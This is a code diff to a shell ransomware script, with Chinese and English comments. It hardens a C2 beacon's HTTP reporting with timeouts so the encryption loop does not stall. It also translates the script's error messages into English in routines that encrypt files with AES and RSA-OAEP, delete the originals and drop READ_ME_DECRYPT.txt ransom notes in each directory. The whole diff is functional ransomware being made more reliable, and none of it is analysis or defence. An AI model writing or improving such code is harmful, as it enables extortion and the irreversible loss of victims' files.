@@ -38,10 +38,17 @@ sha256_file(){
 
 http_post(){
     # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
+    #
+    # ★ 超时是必须的，不是优化项。
+    # beacon() 在加密主循环里【每 8 秒】调用一次本函数。一旦 C2 不可达
+    # （下线、防火墙、受害主机出口被打满），不带超时的 curl 会一直阻塞在
+    # TCP connect 上——curl 默认连接超时是 300 秒，而 wget 默认还会重试 20 次。
+    # 效果就是：每 8 秒的例行上报变成每 5 分钟一次的长阻塞，整个加密过程停滞。
+    # 这里把单次上报硬限制在 8 秒内（连接 3 秒），失败即返回交由调用方记录。
     if has_cmd curl; then
-        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
+        curl -s -f --connect-timeout 3 --max-time 8 -X POST -d "$2" "$1" >/dev/null 2>&1
     elif has_cmd wget; then
-        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
+        wget -q -O /dev/null --tries=1 --timeout=8 --post-data="$2" "$1" 2>/dev/null
     else
         return 127
     fi
@@ -137,12 +144,12 @@ preflight(){
 encrypt_file(){
     FILE="$1"
     PUBKEY="$2"
-    [ -f "$FILE" ] || { note_fail "文件不存在或不是普通文件"; return 1; }
-    [ -s "$FILE" ] || { note_fail "文件为空(0字节)"; return 1; }
+    [ -f "$FILE" ] || { note_fail "file missing or not a regular file"; return 1; }
+    [ -s "$FILE" ] || { note_fail "file is empty (0 bytes)"; return 1; }
     case "$FILE" in *.jasmin) return 1;; esac
 
-    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || { note_fail "openssl rand 失败(熵源/openssl异常)"; return 1; }
-    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || { note_fail "openssl rand 失败(熵源/openssl异常)"; return 1; }
+    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || { note_fail "openssl rand failed (entropy source or openssl error)"; return 1; }
+    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || { note_fail "openssl rand failed (entropy source or openssl error)"; return 1; }
 
     ENC="${FILE}.jasmin"
     T_KIV="/tmp/.jkiv_$$"
@@ -150,12 +157,12 @@ encrypt_file(){
     T_HASH="/tmp/.jhash_$$"
 
     # SHA256 原始文件（原始32字节）
-    sha256_file "$FILE" > "$T_HASH" || { note_fail "计算SHA256失败(读取被拒/文件损坏)"; rm -f "$T_HASH"; return 1; }
-    [ -s "$T_HASH" ] || { note_fail "SHA256结果为空"; rm -f "$T_HASH"; return 1; }
+    sha256_file "$FILE" > "$T_HASH" || { note_fail "SHA256 failed (read denied or file corrupt)"; rm -f "$T_HASH"; return 1; }
+    [ -s "$T_HASH" ] || { note_fail "SHA256 result is empty"; rm -f "$T_HASH"; return 1; }
 
     # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
     printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
-    [ -s "$T_KIV" ] || { note_fail "key/iv 二进制转换失败(hex2bin)"; rm -f "$T_KIV" "$T_HASH"; return 1; }
+    [ -s "$T_KIV" ] || { note_fail "key/iv binary conversion failed (hex2bin)"; rm -f "$T_KIV" "$T_HASH"; return 1; }
 
     # RSA-OAEP 加密 key+iv
     openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
@@ -163,7 +170,7 @@ encrypt_file(){
         -pkeyopt rsa_padding_mode:oaep \
         -pkeyopt rsa_oaep_md:sha256 \
         -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
-        note_fail "RSA-OAEP 加密失败(公钥无效或磁盘满)"
+        note_fail "RSA-OAEP encryption failed (bad public key or disk full)"
         rm -f "$T_KIV" "$T_EK" "$T_HASH"
         return 1
     }
@@ -177,18 +184,18 @@ encrypt_file(){
     # 现在：目标文件里先占 32B，密文由 openssl 直接追加（stdout 重定向），最后回填 SHA256。
     # 全程零额外空间。各步失败都要捕获 —— 磁盘满时重定向会静默产出空文件。
     _cleanup(){ rm -f "$ENC" "$T_KIV" "$T_EK" "$T_HASH"; }
-    : > "$ENC" 2>/dev/null || { note_fail "写入 .jasmin 失败(磁盘空间不足/只读/权限)"; rm -f "$T_KIV" "$T_EK" "$T_HASH"; return 1; }
+    : > "$ENC" 2>/dev/null || { note_fail "cannot write .jasmin (no space / read-only / permission denied)"; rm -f "$T_KIV" "$T_EK" "$T_HASH"; return 1; }
     if ! dd if=/dev/zero bs=32 count=1 >> "$ENC" 2>/dev/null; then
-        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/inode耗尽)"; _cleanup; return 1
+        note_fail "cannot write .jasmin (no space / read-only / out of inodes)"; _cleanup; return 1
     fi
     if ! openssl enc -aes-256-cbc -nosalt -in "$FILE" -K "$KEY_HEX" -iv "$IV_HEX" >> "$ENC" 2>/dev/null; then
-        note_fail "AES加密失败(磁盘空间不足/只读/权限)"; _cleanup; return 1
+        note_fail "AES encryption failed (no space / read-only / permission denied)"; _cleanup; return 1
     fi
     if ! { cat "$T_EK"; dec2le "$EK_LEN"; } >> "$ENC" 2>/dev/null; then
-        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/inode耗尽)"; _cleanup; return 1
+        note_fail "cannot write .jasmin (no space / read-only / out of inodes)"; _cleanup; return 1
     fi
     if ! dd if="$T_HASH" of="$ENC" bs=32 count=1 conv=notrunc 2>/dev/null; then
-        note_fail "回填SHA256失败(磁盘空间不足/只读)"; _cleanup; return 1
+        note_fail "SHA256 write-back failed (no space / read-only)"; _cleanup; return 1
     fi
 
     rm -f "$T_KIV" "$T_EK" "$T_HASH"
@@ -197,7 +204,7 @@ encrypt_file(){
         rm -f "$FILE"
         return 0
     else
-        note_fail "生成的 .jasmin 为空(磁盘空间不足/只读/inode耗尽)"
+        note_fail "generated .jasmin is empty (no space / read-only / out of inodes)"
         rm -f "$ENC"
         return 1
     fi
@@ -253,7 +260,7 @@ drop_notes(){
             if printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null; then
                 WROTE=$((WROTE+1))
             else
-                printf '%s\n' "勒索信写入失败(磁盘满/只读): $D" >> "$FAILS_FILE"
+                printf '%s\n' "ransom note write failed (disk full / read-only): $D" >> "$FAILS_FILE"
             fi
         done < "$ND.uniq"
         rm -f "$ND.uniq"
@@ -318,7 +325,7 @@ main(){
     log "Found $TOTAL target file(s), $(fmt_bytes "$TOTAL_BYTES") total"
     [ "$TOTAL" -gt 0 ] || log "Note: no matching target files found (check the EXTS whitelist)"
 
-    preflight "$TOTAL_BYTES"    # 空间预检
+    preflight "$TOTAL_BYTES"    # space preflight
 
     COUNT=0
     PROCESSED=0
@@ -345,7 +352,7 @@ main(){
                 if encrypt_file "$F" "$PUBKEY"; then
                     COUNT=$((COUNT+1))
                     SIZE=$((SIZE+FSIZE))
-                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # 记录目录，供勒索信投放
+                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # record dirs for ransom note drop
                     case ",$TYPES," in
                         *",$EXT,"*) ;;
                         *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
@@ -372,7 +379,7 @@ main(){
     rm -f "$PUBKEY"
 
     log "Encryption complete: $COUNT/$TOTAL file(s), $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
-    report_fails    # 失败必须可见，否则无从定位
+    report_fails    # failures must be visible
 
     if [ "$TOTAL" -gt 0 ]; then
         drop_notes "$SID" "$NOTE_DIRS"
